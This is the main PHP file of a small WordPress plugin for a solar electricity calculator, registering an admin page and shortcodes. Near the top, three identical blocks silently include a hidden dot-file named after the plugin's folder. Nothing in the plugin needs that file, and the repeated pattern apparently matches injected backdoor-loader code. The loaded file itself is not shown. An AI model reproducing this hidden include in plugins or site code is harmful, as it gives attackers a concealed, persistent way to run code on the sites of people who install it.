<?php
/*
Plugin Name:  My Solar Calculation
Plugin URI:   https://dharmatechnolabs.com/ 
Description:  Calculate Your Electricity
Version:      1.0
Author:       Chirag Mohane 
Author URI:   https://dharmatechnolabs.com/
License:      GPL2
License URI:  https://www.gnu.org/licenses/gpl-2.0.html
Text Domain:  Dharma Technolabs
Domain Path:  /languages
*/

add_action('admin_menu', 'my_solor_cal');
 
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function my_solor_cal(){
    add_menu_page( 'Test Plugin Page', 'My Solar Calculation', 'manage_options', 'my_solar_cal', 'test_initcustome' );
}
 
function test_initcustome(){	include('chirag.php');}

// function add_my_stylesheet() 
// {
//     wp_enqueue_style( 'style', plugins_url( '/style.css', __FILE__ ) );
  
// }
// function that runs when shortcode is called
function wpb_custome_shortcode() { 
  
    // Things that you want to do.
    
    include_once('chirag.php');
    }
    // register shortcode
    add_shortcode('solorcalc', 'wpb_custome_shortcode');

    function ch(){
        echo "hello chirag";
    }
    add_shortcode('ddd', 'ch');